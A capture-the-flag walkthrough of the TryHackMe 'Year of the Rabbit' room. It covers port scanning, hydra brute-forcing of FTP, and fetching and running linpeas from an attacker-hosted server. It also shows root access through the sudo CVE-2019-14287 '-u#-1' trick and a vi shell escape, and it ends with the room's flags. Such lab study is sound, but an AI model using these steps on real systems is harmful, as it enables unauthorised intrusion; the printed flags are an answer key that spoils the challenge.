# Year of the Rabbit

## Overview

Time to enter the warren...

Room link: https://tryhackme.com/room/yearoftherabbit
Difficulty: **Easy**

## Walkthrough

Initiating a full port scan against the target, we see ports 21 (FTP), 22 (SSH), and 80 (HTTP) are open.

```console
$ nmap -p- -T4 <VICTIM_IP> -oN scans/initial_nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-02 10:38 GMT
Nmap scan report for <VICTIM_IP>
Host is up (0.074s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.47 seconds
```

Running a full scan against these ports shows the host is running VSFTPd version `3.0.2` and Apache `2.4.10` on a Linux-based system:

```console
$ nmap -p 21,22,80 -A -T4 <VICTIM_IP> -oN scans/open_ports.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-02 10:39 GMT
Nmap scan report for <VICTIM_IP>
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (99%), Linux 3.10 - 3.13 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 7.1.1 - 7.1.2 (93%), Linux 3.13 - 4.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.66 ms 10.9.0.1
2   30.50 ms <VICTIM_IP>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
```

Navigating to the website shows the Apache2 default homepage:

![Year of the Rabbit - Default Apache](/images/yotr_default_apache.png)

From a Gobuster scan, we see an `/assets` directory:

![Year of the Rabbit - Assets](/images/yotr_assets.png)

From `styles.css`, we see a hidden comment for `sup3r_s3cr3t_fl4g.php`:

![Year of the Rabbit - Styles.css](/images/yotr_styles_css.png)

Navigating to this site for the first time redirects us to the infamous Never Gonna Give You Up, with an alert on the site hinting that we should turn off JavaScript:

![Year of the Rabbit - Sup3r S3cret Fl4g](/images/yotr_sup3r_s3cret_fl4g.png)

Instead of this, we can inspect the requests in BurpSuite which reveals hidden directory `/WExYY2Cv-qU`:

![Year of the Rabbit - Hidden Directory](/images/yotr_hidden_directory.png)

Inspecting this directory shows a single `Hot_Babe.png` image file:

![Year of the Rabbit - Directory Contents](/images/yotr_directory_contents.png)

Downloading the file and running `binwalk` identifies hidden data within the file, the `strings` output for which shows a list of credentials for the `ftpuser`:

```console
$ binwalk -e Hot_Babe.png
$ strings _
```

![Year of the Rabbit - Dictionary](/images/yotr_dictionary.png)

Using `hydra` now with our dictionary, we can obtain the `ftpuser` user's password:

```console
$ hydra -l ftpuser -P ftp_pass.txt ftp://<VICTIM_IP> -t 30
```

![Year of the Rabbit - Hydra](/images/yotr_hydra.png)

We can then successfully authenticate as `ftpuser`:

![Year of the Rabbit - Login Success](/images/yotr_login_success.png)

Listing the files in the directory, we see a `Eli's Creds.txt` file:

![Year of the Rabbit - FTP Get](/images/yotr_ftp_get.png)

Viewing the contents, this file turns out to be encoded using [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck), an esoteric programming language:

![Year of the Rabbit - Eli's Creds](/images/yotr_eli_creds.png)

Using [dcode-fr - brainfuck](https://www.dcode.fr/brainfuck-language), we can decode this :

![Year of the Rabbit - Brainfuck](/images/yotr_brainfuck.png)

Logging in via SSH:

![Year of the Rabbit - SSH Login](/images/yotr_ssh_login.png)

Searching for this directory, we find it within `/usr/games/`:

```console
$ find / -name "s3cr3t" 2>/dev/null
```

![Year of the Rabbit - /usr/games/secret](/images/yotr_usr_games_s3cr3t.png)

The file `.th1s_m3ss4g3_15_f0r_gw3nd0l1n3_0nly!` shows their credentials:

![Year of the Rabbit - Gwendoline Creds](/images/yotr_gwendoline_creds.png)

Can now `su` to `gwendoline` and view the contents of `user.txt` within `/home/gwendoline`:

![Year of the Rabbit - user.txt](/images/yotr_user_txt.png)

Running `sudo -l`, we see the following output:

![Year of the Rabbit - sudo -l](/images/yotr_sudo_l.png)

This means we can run `/usr/bin/vi /home/gwendoline/user.txt` as any user other than `root`.

To enumerate the host further, we can download [linpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20231203-9cdcb38f0) to the host:

```
# Attacker machine
$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20231203-9cdcb38f/linpeas.sh
$ sudo python3 -m http.server 8080

# Victim machine
$ wget http://<ATTACKER_IP>:8080/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

From the results, we see an outdated version of `sudo`:

![Year of the Rabbit - Linpeas Sudo Version](/images/yotr_linpeas_sudo.png)

Searching for exploits, we see a local privilege escalation vulnerability dubbed CVE-2019-14287. With this version of `sudo`, no check is made for the existence of a specified user ID, so it executes a given binary with arbitrary user ID and `sudo privileges`. It uses the arguments `-u#-1` which returns `0`, the `root` user's ID:

```console
$ sudo -l
...
	(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

This will open the `vi` text editor which can be escaped by typing `:!/bin/sh` which will launch a shell as `root`:

![Year of the Rabbit - Root flag](/images/yotr_root_flag.png)

-----

1. What is the user flag?

```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

2. What is the root flag?

```
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```